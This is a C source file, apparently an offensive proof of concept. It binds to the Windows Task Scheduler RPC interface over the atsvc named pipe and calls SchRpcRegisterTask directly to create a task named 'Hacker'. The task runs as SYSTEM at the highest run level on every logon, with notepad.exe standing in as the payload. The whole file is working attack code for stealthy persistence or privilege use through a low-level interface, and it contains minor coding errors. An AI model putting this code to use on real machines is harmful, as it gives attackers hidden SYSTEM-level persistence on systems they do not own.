#include <stdio.h>
#include <Windows.h>
#include "SchRPC.h"


#pragma comment(lib, "rpcrt4.lib")

NTSTATUS status;
#define TASK_CREATE 2
#define TASK_LOGON_NONE 0

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

static const wchar_t* xml =
L"<?xml version=\"1.0\" ?>\n"
L" <Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
L"     <RegistrationInfo>\n"
L"         <Date>2005-10-11T13:21:17-08:00</Date>\n"
L"         <Author>AuthorName</Author>\n"
L"         <Version>1.0.0</Version>\n"
L"         <Description>\n"
L"             Starts Notepad when a specified user logs on.\n"
L"         </Description>\n"
L"     </RegistrationInfo>\n"
L"     <Triggers>\n"
L"         <LogonTrigger>\n"
L"             <StartBoundary>2005-10-11T13:21:17-08:00</StartBoundary>\n"
L"             <EndBoundary>2006-01-01T00:00:00-08:00</EndBoundary>\n"
L"             <Enabled>true</Enabled>\n"
L"         </LogonTrigger>\n"
L"     </Triggers>\n"
L"  <Principals>\n"
L"    <Principal id=\"System\">\n"
L"      <RunLevel>HighestAvailable</RunLevel>\n"
L"      <UserId>S-1-5-18</UserId>\n"
L"    </Principal>\n"
L"  </Principals>\n"
L"     <Settings>\n"
L"         <Enabled>true</Enabled>\n"
L"         <AllowStartOnDemand>true</AllowStartOnDemand>\n"
L"         <AllowHardTerminate>true</AllowHardTerminate>\n"
L"     </Settings>\n"
L"     <Actions>\n"
L"         <Exec>\n"
L"             <Command>notepad.exe</Command>\n"
L"         </Exec>\n"
L"     </Actions>\n"
L" </Task>\n";

handle_t __RPC_USER
PSAMPR_SERVER_NAME_bind()
{
	handle_t hBinding = NULL;
	RPC_WSTR StringBinding;
	RPC_STATUS status;
	RPC_WSTR ProtSeq = L"ncacn_np";
	RPC_WSTR Endpoint = L"\\pipe\\atsvc";
	RPC_SECURITY_QOS SecurityQOS = { 0 };

	status = RpcStringBindingComposeW(
		NULL,
		ProtSeq,
		(RPC_WSTR)L"localhost",
		Endpoint,
		NULL,
		&StringBinding);
	if (status)
	{
		wprintf("RpcStringBindingCompose  0x%x\n", status);
		return NULL;
	}

	/* Set the binding handle that will be used to bind to the server. */
	status = RpcBindingFromStringBindingW(StringBinding,
		&hBinding);
	if (status)
	{
		wprintf("RpcBindingFromStringBinding  0x%x\n", status);
	}
	SecurityQOS.Version = 1;
	SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
	SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
	SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
	RpcBindingSetAuthInfoExA(hBinding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 0xA, 0, RPC_C_AUTHZ_NONE, &SecurityQOS);

	status = RpcStringFreeW(&StringBinding);
	if (status)
	{
		wprintf("RpcStringFree  0x%x\n", status);
	}

	return hBinding;
}


int wmain(int argc) {

	//GetFunction();
	handle_t handle = PSAMPR_SERVER_NAME_bind();

	wchar_t xmlBuffer[4096];
	wchar_t* actualPath = NULL;
	TASK_XML_ERROR_INFO* errorInfo = NULL;

	swprintf(xmlBuffer, 4096, xml);

	status = SchRpcRegisterTask(handle, L"\\Hacker", xmlBuffer, TASK_CREATE, NULL, 0, 0, NULL, &actualPath, &errorInfo);

	if (NT_SUCCESS(status))
	{
		wprintf(L"Add Serice Success");
	}
	else {
		wprintf(L"SchRpcRegisterTask Error Code: %ld", status);
	}

	return 0;
}



